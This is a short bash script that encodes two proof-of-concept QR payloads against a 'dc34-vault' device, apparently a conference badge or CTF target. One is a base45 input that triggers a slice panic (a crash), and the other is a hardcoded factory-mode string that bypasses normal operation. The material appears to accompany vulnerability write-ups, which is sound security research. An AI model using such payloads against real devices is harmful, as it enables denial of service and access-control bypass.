#!/usr/bin/env bash
# Author: Infinit3i
# Generates the QR payloads used by PoC 01 (vault crash) and PoC 02 (factory mode).
# Tries qrencode, then python3 qrcode, then falls back to printing the payload
# so you can type it into any phone QR-generator app.
set -u
here="$(cd "$(dirname "$0")" && pwd)"

gen() {
  local text="$1" out="$2"
  if command -v qrencode >/dev/null 2>&1; then
    qrencode -s 8 -o "$out" "$text" && echo "wrote $out"
  elif python3 -c "import qrcode" >/dev/null 2>&1; then
    python3 -c "import qrcode,sys; qrcode.make(sys.argv[1]).save(sys.argv[2])" "$text" "$out" && echo "wrote $out"
  else
    echo "no QR tool installed (try: sudo apt install qrencode   OR   pip install qrcode[pil])"
    echo "payload for a phone QR app -> $text"
    return 0
  fi
  echo "  payload: $text"
}

# PoC 01: base45 that decodes to fewer than 16 bytes -> data[..16] slice panics the vault
gen '00' "$here/crash.png"

# PoC 02: hardcoded factory-mode constant published in dc34-vault/src/main.rs:824
gen 'factory://factory-aae949f6969-lorem-ipsum-data' "$here/factory.png"

echo
echo "Display crash.png / factory.png on a phone or print them, then follow"
echo "01_qr_header_crash_CONFIRMED.md and 02_factory_mode_qr.md."
